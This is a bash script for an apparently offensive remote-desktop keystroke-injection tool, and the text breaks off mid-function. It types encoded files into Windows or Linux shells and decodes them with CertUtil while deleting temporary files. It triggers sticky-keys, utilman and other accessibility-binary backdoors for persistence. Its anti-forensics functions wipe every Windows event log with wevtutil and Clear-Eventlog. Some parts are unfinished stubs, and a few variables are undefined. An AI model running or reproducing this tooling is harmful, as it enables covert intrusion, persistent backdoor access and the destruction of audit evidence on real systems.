#!/bin/bash

function print_status() {
    local status="${1}"
    local message="${2}"

    # Blue for information
    # Bold Blue for progress
    # Bold Green for completed
    # Bold Yellow for warning
    # Bold Red for error
    # * default to white
    case "${status}" in
        information) color="\033[34m[INFO]\033[0m" ;;
        progress) color="\033[1;34m[PROG]\033[0m" ;;
        completed) color="\033[1;32m[DONE]\033[0m" ;;
        warning) color="\033[1;33m[WARN]\033[0m" ;;
        error) color="\033[1;31m[ERROR]\033[0m" ;;
        *) color="\033[0m" ;;
    esac

    echo -e "${color} ${message}"
}

function check_elevated() {
    if [[ ${EUID} -ne 0 ]]
    then
        print_status "error" "Execute the script with elevated privileges (without sudo)."
        print_status "information" "Terminating program..."
        exit 1
    fi
}

function check_dependencies() {
    local programs=("xfreerdp" "remmina")
    local missing_dependencies=()
    
    if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
    then
	    programs+=("xdotool")
	    programs+=("xfreerdp")
    elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
    then
		programs+=("wlrctl")
		programs+=("wlfreerdp")
    fi

    for program in "${programs[@]}"
    do
        if [[ -z $(which "${program}") ]]
        then
            missing_dependencies+=("${program}")
        fi
    done

    if [[ ${#missing_dependencies[@]} -ne 0 ]]
    then
        print_status "warning" "Required dependencies: ${missing_dependencies[@]}"
        print_status "information" "Terminating program..."
        exit 1
    fi
}

function get_window_sync_id() {
    local windowname="${1}"
    local sync_id

	if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
	then
		sync_id=$(xdotool search --name "${windowname}" getwindowfocus getactivewindow)
	elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
	then
		print_status "error" "Not implemented!"
		print_status "information" "Terminating program..."
		exit 1
	fi

    echo "${sync_id}"
}

function keyboard() {
    local input="${1}"
    local key="${2}"

	if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
	then
		case "${key}" in
            "keystrokes")
                xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type "${input}"
                ;;
            "escape_keystrokes")
                xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
                ;;
	        "custom_keystroke")
	    		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key "${input}"
	        	;;
    	esac
	elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
	then
		print_status "error" "Not implemented!"
		print_status "information" "Terminating program..."
		exit 1

		case "${key}" in
            "keystrokes")
                wlrctl
                ;;
            "escape_keystrokes")
                wlrctl
                ;;
	        "custom_keystroke")
	    		wlrctl
	        	;;
	    esac
	fi
}

function randomize_string() {
    local characters="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local length=$(( RANDOM % 13 + 8 ))  # A length of characters between 8 and 20
    local string=""

    for (( i=0; i<${length}; i++ ))
    do
        local random_index=$(( RANDOM % ${#characters} ))
        string+=${characters:$random_index:1}
    done

    echo "${string}"
}

function count_lines() {
    local file="${1}"
    local counter=0

    while read -r line
    do
        (( counter++ ))
    done < "${file}"

    echo "${counter}"
}

# There is a limitation with this implementation. 
# However, this is ideal for uploading files with a specific path.

function DirectoryName() {
    local filepath="${1}"

    # Determine the type of slashes used in the path
    if [[ "${filepath}" == *\\* ]]
    then
        # Handle paths with backslashes (Windows style)
        local directory_name="${filepath%\\*}"

        # Special case: if the result is empty, it means the path was something like "C:\file"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "."
            return
        fi

        echo "${directory_name}"
    else
        # Handle paths with forward slashes (Unix style)
        if [[ "${filepath}" != */* ]]
        then
            echo "."
            return
        fi

        local directory_name="${filepath%/*}"

        # Special case: if the result is empty, it means the path was something like "/file"
        if [[ -z "${directory_name}" || "${directory_name}" == "${filepath}" ]]
        then
            echo "/"
            return
        fi

        echo "${directory_name}"
    fi
}

function terminate_program() {
    print_status "warning" "SIGINT response detected!"
    print_status "information" "Terminating program..."
    exit 1
}

trap terminate_program SIGINT

function automate() {
    local file="${1}"
    local lines=$(count_lines "${file}")

    print_status "progress" "Executing commands..."

    # If there are zero new lines just read the remaining file's contents.
    if [[ ${lines} -eq 0 ]]
    then
		read contents < "${file}"
		keyboard "${contents}" "escape_keystrokes"
		keyboard "Return" "custom_keystroke"
    else
        while read -r line
        do
            keyboard "${line}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
        done < "${file}"
    fi
    print_status "completed" "Task completed!"
}

function dialogue_box() {
    local commands="${1}"

    print_status "information" "Checking one of the lines reaches 260 character limit"
    if [[ ${#commands} -ge 260 ]]
    then
        print_status "error" "Character Limit reached! Terminating program."
        exit 1
    fi

    print_status "progress" "Executing commands..."
    keyboard "Super+r" "custom_keystroke"
    keyboard "${commands}" "escape_keystrokes"
    keyboard "Return" "custom_keystroke"
    print_status "completed" "Task completed!"
}

function execute() {
    local commands="${1}"
    local method="${2}"

    case "${method}" in
        none)
            print_status "progress" "Executing commands..."
            keyboard "${commands}" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            print_status "completed" "Task completed!"
            ;;
        dialogbox)
            dialogue_box "${commands}"
            ;;
        *)
            print_status "error" "Invalid Execution Type!" >&2
            print_status "information" "Available methods are: none, and dialogbox"
			print_status "information" "Terminating program..."
            exit 1
            ;;
    esac
}

function base64_encoding_scheme() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local file_charset=$(file --mime-encoding "${input}")
    local file_type=${file_charset##*: }
    local data
    local chunks=100
    local random_var_one=$(randomize_string)
    local random_var_two=$(randomize_string)

    # TODO: Implement encryption method through base64 with -e,--evasion flag
    # $ rks -i file -o output -m pwshb64 -e compression
    # $ iconv -t UTF-16LE file.txt | gzip | basenc -w 0 --base64
    # $ gzip -c file.exe | basenc -w 0 --base64

    # $ rks -i file -o output -m pwshb64 -e aes256
    # $ iconv -t UTF-16LE file.txt | gzip | openssl enc -a -e -A
    # $ gzip -c file.exe | openssl enc -a -e -A

    # Check if input is passed as file
    if [[ -f "${input}" && ("${platform}" == "windows" || "${platform}" == "linux") && "${mode}" == "powershell" ]]
    then
        if [[ "${file_type}" == "binary" ]]
        then
        	data=$(basenc -w 0 --base64 "${input}")
        else
            data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
        fi

        print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "\$${random_var_one} = \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "\$${random_var_one} += \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

        keyboard "[byte[]]\$${random_var_two} = [Convert]::FromBase64String(\$${random_var_one})" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_var_two})" "keystrokes"
        keyboard "Return" "custom_keystroke"

        print_status "completed" "File transferred!"
    elif [[ "${platform}" == "linux" && "${mode}" == "console" ]]
    then
        data=$(basenc -w 0 --base64 "${input}")

        print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "${random_var_one}=\"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "${random_var_one}+=\"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

        keyboard "base64 -d <<< \$${random_var_one} > \"${output_file}\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
        print_status "completed" "File transferred!"
    fi
}

function base32_radix() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local data
    local chunks=100
    local random_var=$(randomize_string)

    # TODO: Implement this feature
    # $ basenc -w 0 --base32 file.txt

    # $ basenc -w 0 --base32hex file.txt

    echo "not implemented"
}

# Using hexadecimal to encode files
function base16_radix() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local data
    local chunks=100
    local random_var=$(randomize_string)
    local random_temp_file=$(randomize_string)
    local directory_path=$(DirectoryName "${output_file}")

    if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
    then
        print_status "error" "Only windows and linux are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" ]]
    then
    	data=$(basenc -w 0 --base16 "${input}")

    	if [[ "${mode}" == "powershell" ]]
    	then
            print_status "progress" "Transferring file..."

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "\$${random_1} = \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "\$${random_1} += \"${data:i:chunks}\"" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_var} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "certutil" ]]
        then
            if [[ "${platform}" != "windows" ]]
            then
                print_status "error" "This method is only exclusive for windows!"
                print_status "information" "Use 'nixhex' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi
            
            # TODO: Make an if statement of limited characters or lines using batch variable via command prompt
            
			if [[ ${#data} -gt 0 ]]
			then
				echo "not implemented"
			fi

            print_status "progress" "Transferring file..."

            # Appends the hexadecimal data in a batch file
        	for (( i=0; i<${#data}; i+=chunks ))
			do
			    if [[ ${i} -eq 0 ]]
			    then
			        keyboard "set ${random_var}=${data:i:chunks}" "keystrokes"
			        keyboard "Return" "custom_keystroke"
			    else
			        keyboard "set ${random_var}=%${random_var}%${data:i:chunks}" "keystrokes"
			        keyboard "Return" "custom_keystroke"
			    fi
			done
			keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
			keyboard "Return" "custom_keystroke"
			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "keystrokes"
			keyboard "Return" "custom_keystroke"
			keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
			keyboard "Return" "custom_keystroke"
    	elif [[ "${mode}" == "console" ]]
    	then
            print_status "progress" "Transferring file..."

            # Split a pair of characters and make it into a hexadecimal format.
            local temp=""
            for (( i=0; i<${#data}; i+=2))
            do
                temp+="\\x${data:i:2}"
            done

            for (( i=0; i<${#temp}; i+=chunks ))
            do
                if [[ ${i} -eq 0 ]]
                then
                    keyboard "${random_var}=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                    keyboard "${random_var}+=\"${temp:i:chunks}\"" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                fi
            done

			# Interpret the backslash to output into a file.
            keyboard "echo -en \$${random_var} > \"${output_file}\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
    	fi
        print_status "completed" "File transferred!"
    fi
}

# Using binary digits of 0 and 1
# to encode files with each 8 bits of size
function base2_radix() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local data
    local chunks=100
    local random_var=$(randomize_string)

    # TODO: Implement this feature
    # $ basenc -w 0 --base2msbf file.txt
    echo "not implemented"
}

# Using decimals to encode files
function base10_radix() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local data
    local chunks=100
    local random_var=$(randomize_string)

    # TODO: Implement this feature
    # $ printf
    echo "not implemented"
}

# Using octals to encode files
function base8_radix() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local data
    local chunks=100
    local random_var=$(randomize_string)

    # TODO: Implement this feature
    # $ od -A n -t o1 -v file.txt | tr -d "[:space:]"
    echo "not implemented"
}

function powershell_outfile() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local file_charset=$(file --mime-encoding "${input}")
    local file_type=${file_charset##*: }
    local data
    local chunks=100
    local hexadecimal=()
    local counter
    local random_temp_file=$(randomize_string)
    local directory_path=$(DirectoryName "${output_file}")

    if [[ "${platform}" != "windows" && "${platform}" != "linux" ]]
    then
        print_status "error" "Only windows and linux are supported for this method!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" ]]
    then
        if [[ "${mode}" == "text" ]]
        then
            if [[ "${file_type}" != "binary" ]]
            then
                print_status "progress" "Checking one of the lines reaches 3477 character limit"
                while read -r line
                do
                    length=${#line}
                    if [[ ${length} -ge 3477 ]]
                    then
                        print_status "error" "Character Limit reached!"
                        print_status "information" "Use 'outfileb64' as a method instead."
                        print_status "information" "Terminating program..."
                        exit 1
                    fi
                done < "${input}"

                print_status "progress" "Transferring file..."
                keyboard "@'" "escape_keystrokes"
                keyboard "Return" "custom_keystroke"
                while read -r line
                do
                    keyboard "${line}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                done < "${input}"

                keyboard "'@ | Out-File ${output_file}" "escape_keystrokes"
                keyboard "Return" "custom_keystroke"
            elif [[ "${file_type}" == "binary" ]]
            then
                print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
                powershell_outfile "${input}" "${output_file}" "${platform}" "certutil"
                exit 1
            fi
        elif [[ "${mode}" == "base64" ]]
        then
            chunks=64

            if [[ "${platform}" != "windows" ]]
            then
                print_status "error" "This method is exclusively used for windows because it relies on 'CertUtil.exe'."
                print_status "information" "Use 'nixb64' method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi

            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base64 "${input}")
            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

	        for (( i=0; i<${#data}; i+=chunks ))
	        do
	            if [[ ${i} -eq 0 ]]
	            then
	            	keyboard "${data:i:chunks}" "keystrokes"
	            	keyboard "Return" "custom_keystroke"
	            else
	            	keyboard "${data:i:chunks}" "keystrokes"
	            	keyboard "Return" "custom_keystroke"
	            fi
	        done

            keyboard "-----END CERTIFICATE-----" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
            keyboard "Return" "custom_keystroke"
            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
            keyboard "Return" "custom_keystroke"
        elif [[ "${mode}" == "hex" ]]
        then
            print_status "progress" "Transferring file..."
            data=$(basenc -w 0 --base16 "${input}")

            # Append the pair of hexadecimal characters in a array
            for (( i=0; i<${#data}; i+=2 ))
            do
            	hexadecimal+=("${data:i:2}")
            done

            keyboard "@'" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"

            counter=0
            for ((i=0; i<${#hexadecimal[@]}; i++))
            do
                if [[ ${counter} -eq 7 ]]
                then
                	keyboard "${hexadecimal[i]}" "keystrokes"
                	keyboard "space" "custom_keystroke"
                elif [[ ${counter} -eq 8 ]]
                then
                	keyboard "space" "custom_keystroke"
                    (( counter++ ))
                elif [[ ${counter} -eq 15 ]]
                then
                	keyboard "${hexadecimal[i]}" "keystrokes"
                	keyboard "Return" "custom_keystroke"
                elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
                then
                    keyboard "${hexadecimal[i]}" "keystrokes"
                    keyboard "Return" "custom_keystroke"
                else
                	keyboard "${hexadecimal[i]}" "keystrokes"
                	keyboard "space" "custom_keystroke"
                fi

                if [[ ${counter} -eq 15 ]]
                then
                    counter=0
                else
                    (( counter++ ))
                fi
            done
            keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escape_keystrokes"
            keyboard "Return" "custom_keystroke"
			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
			keyboard "Return" "custom_keystroke"
			keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
			keyboard "Return" "custom_keystroke"
        fi
    fi

    print_status "completed" "File transferred!"
}

function copy_con() {
    local input="${1}"
    local output_file="${2}"
    local platform="${3}"
    local mode="${4}"
    local file_charset=$(file --mime-encoding "${input}")
    local file_type=${file_charset##*: }
    local lines=$(count_lines "${input}")
    local data
    local chunks
    local hexadecimal=()
    local counter
    local random_temp_file=$(randomize_string)
    local directory_path=$(DirectoryName "${output_file}")

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "copycon only exists on Windows operating system!"
        print_status "information" "Use 'pwshb64' method instead."
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ -f "${input}" && "${mode}" == "text" ]]
    then
        print_status "progress" "Checking one of the lines reaches 255 character limit"
        while read -r line
        do
            if [[ ${#line} -ge 255 ]]
            then
                print_status "error" "Character Limit reached!"
                print_status "information" "Use 'cmdb64' as a method instead."
                print_status "information" "Terminating program..."
                exit 1
            fi
        done < "${input}"

        print_status "progress" "Transferring file..."
        keyboard "copy con ${output_file}" "keystrokes"
        keyboard "Return" "custom_keystroke"

        counter=1
        while read -r line
        do
            if [[ ${counter} -ne ${lines} ]]
            then
                keyboard "${line}" "escape_keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "${line}" "escape_keystrokes"
                keyboard "Ctrl+Z" "custom_keystroke"
                keyboard "Return" "custom_keystroke"
            fi
            (( counter++ ))
        done < "${input}"
    elif [[ "${mode}" == "base64" ]]
    then
        chunks=64

        if [[ "${file_type}" == "binary" ]]
        then
            data=$(basenc -w 0 --base64 "${input}")
        else
        	data=$(iconv -f ASCII -t UTF-16LE "${input}" | basenc -w 0 --base64)
        fi

        print_status "progress" "Transferring file..."
        keyboard "copy con \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
        keyboard "Return" "custom_keystroke"

        for (( i=0; i<${#data}; i+=chunks ))
        do
            if [[ ${i} -eq 0 ]]
            then
                keyboard "${data:i:chunks}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            else
                keyboard "${data:i:chunks}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            fi
        done

        keyboard "-----END CERTIFICATE-----" "keystrokes"
        keyboard "Ctrl+Z" "custom_keystroke"
        keyboard "Return" "custom_keystroke"
        keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
        keyboard "Return" "custom_keystroke"
        keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
        keyboard "Return" "custom_keystroke"
    elif [[ "${mode}" == "hex" ]]
    then
    	print_status "progress" "Transferring file..."
        data=$(basenc -w 0 --base16 "${input}")

        # Append the pair of hexadecimal characters in a array
        for (( i=0; i<${#data}; i+=2 ))
        do
        	hexadecimal+=("${data:i:2}")
        done

        keyboard "copy con \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
        keyboard "Return" "custom_keystroke"

		counter=0
		for ((i=0; i<${#hexadecimal[@]}; i++))
		do
            if [[ ${counter} -eq 7 ]]
            then
                keyboard "${hexadecimal[i]}" "keystrokes"
                keyboard "space" "custom_keystroke"
            elif [[ ${counter} -eq 8 ]]
            then
                keyboard "space" "custom_keystroke"
                (( counter++ ))
            elif [[ ${counter} -eq 15 ]]
            then
                keyboard "${hexadecimal[i]}" "keystrokes"
                keyboard "Return" "custom_keystroke"
            elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
            then
                keyboard "${hexadecimal[i]}" "keystrokes"
                keyboard "Ctrl+Z" "custom_keystroke"
                keyboard "Return" "custom_keystroke"
            else
               	keyboard "${hexadecimal[i]}" "keystrokes"
               	keyboard "space" "custom_keystroke"
            fi

            if [[ ${counter} -eq 15 ]]
            then
                counter=0
            else
                (( counter++ ))
            fi
        done

		keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
		keyboard "Return" "custom_keystroke"
		keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
		keyboard "Return" "custom_keystroke"
    fi

    print_status "completed" "File transferred!"
}

function upload() {
    local local_file="${1}"
    local remote_file="${2}"
    local platform="${3}"
    local method="${4}"
    local action="${5}"
    local evasion="${6}"

    # TODO: Implement action for alternatives commands, such as "compression" (gzip)
    # and evasion for implementating encryption

    # Add more upload methods Base2, Base8, Base10

    case "${method}" in
        "" | pwshb64)
            base64_encoding_scheme "${local_file}" "${remote_file}" "${platform}" "powershell" "${action}" "${evasion}"
            ;;
        cmdb64)
            copy_con "${local_file}" "${remote_file}" "${platform}" "base64"
            ;;
        nixb64)
            base64_encoding_scheme "${local_file}" "${remote_file}" "${platform}" "console" "${action}"
            ;;
        outfile)
            powershell_outfile "${local_file}" "${remote_file}" "${platform}" "text"
            ;;
        outfileb64)
            powershell_outfile "${local_file}" "${remote_file}" "${platform}" "base64"
            ;;
        copycon)
            copy_con "${local_file}" "${remote_file}" "${platform}" "text"
            ;;
        pwshhex)
            base16_radix "${local_file}" "${remote_file}" "${platform}" "powershell"
            ;;
        cmdhex)
            base16_radix "${local_file}" "${remote_file}" "${platform}" "certutil"
            ;;
        copyconhex)
            copy_con "${local_file}" "${remote_file}" "${platform}" "hex"
            ;;
        nixhex)
            base16_radix "${local_file}" "${remote_file}" "${platform}" "console"
            ;;
        outfilehex)
            powershell_outfile "${local_file}" "${remote_file}" "${platform}" "hex"
            ;;
        *)
            print_status "error" "Invalid File Transfer Technique!" >&2
            print_status "information" "Available methods are: pwshb64, cmdb64, nixb64, outfile, outfileb64, copycon, pwshhex, cmdhex, copyconhex, nixhex, and outfilehex"
			print_status "information" "Terminating program..."
            exit 1
            ;;
    esac
}

function bypassuac() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    echo "not implemented"
}

function elevate() {
    local elevate_method="${1}"
    local elevate_action="${2}"
    local platform="${3}"
    # TODO: add -a, --action flag
    # -a info -p <windows | linux> -m bypassuac

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "UAC only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    echo "Not implemented"
}

function create_user() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" == "windows" ]]
    then
        echo "Windows"
    elif [[ "${platform}" == "linux" ]]
    then
        echo "Linux"
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    else
        print_status "error" "Invalid mode!"
    fi
}

function sticky_keys() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
        print_status "information" "Pressing SHIFT key 5 times"
        for (( i=1; i<=5; i++ ))
        do
            print_status "progress" "SHIFT: ${i}"
            keyboard "shift" "custom_keystroke"
        done
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function utility_manager() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
        keyboard "Super+u" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function magnifier() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating magnifier.exe backdoor..."
        keyboard "Super+equal" "custom_keystroke"
        keyboard "Super+minus" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function narrator() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating narrator.exe backdoor..."
        keyboard "Super+Return" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function display_switch() {
    local platform="${1}"
    local action="${2}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating displayswitch.exe backdoor..."
        keyboard "Super+p" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function persistence() {
    local platform="${1}"
    local persistence_method="${2}"
    local persistence_action="${3}"

    # -a, --action flag "info,backdoor". For "info" contains the execution commands
    # for both command prompt and powershell. To enumerate, persistence and cleanup
    # For "backdoor" to activate the backdoor
    # TODO: Fill in the rest of the persistence methods
    case "${persistence_method}" in
        createuser)
            create_user "${platform}" "${persistence_action}"
            ;;
        sethc)
            sticky_keys "${platform}" "${persistence_action}"
            ;;
        utilman)
            utility_manager "${platform}" "${persistence_action}"
            ;;
        magnifier)
            magnifier "${platform}" "${persistence_action}"
            ;;
        narrator)
            narrator "${platform}" "${persistence_action}"
            ;;
        displayswitch)
            display_switch "${platform}" "${persistence_action}"
            ;;
        *)
            print_status "error" "Invalid Persistence Technique!" >&2
            exit 1
            ;;
    esac
}

function window_event_log_utility() {
    local action="${1}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "quick" ]]
    then
        execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
    elif [[ "${action}" == "full" ]]
    then
    # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function clear_event_log() {
    local action="${1}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        echo "${description}"
    elif [[ "${action}" == "quick" ]]
    then
        execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
    elif [[ "${action}" == "full" ]]
    then
    # TODO: Include the wiper and then transfer it with Base64 powershell terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function event_viewer() {
    local action="${1}"
    read -d '' description << EndOfText
Fill in the description of the technique
EndOfText

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        # TODO: Include information of this technique
        echo ""
    elif [[ "${action}" == "manual" ]]
    then
        dialogue_box "eventvwr.msc"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function antiforensics() {
    local antiforensics_method="${1}"
    local antiforensics_action="${2}"
    local platform="${3}"
    # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box

    # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
    # -p <windows | linux> -m <wevtutil | clearevent>

    # Batch script
    # Powershell script
    # Bash script
    case "${antiforensics_method}" in
        wevtutil)
            window_event_log_utility "${antiforensics_method}" "${platform}" "${antiforensics_action}"
            ;;
        clearevent)
            clear_event_log "${antiforensics_method}" "${platform}" "${antiforensics_action}"
            ;;
        eventvwr)
            event_viewer "${antiforensics_method}" "${platform}" "${antiforensics_action}"
            ;;
        *)
            print_status "error" "Invalid Antiforensic Technique!" >&2
            exit 1
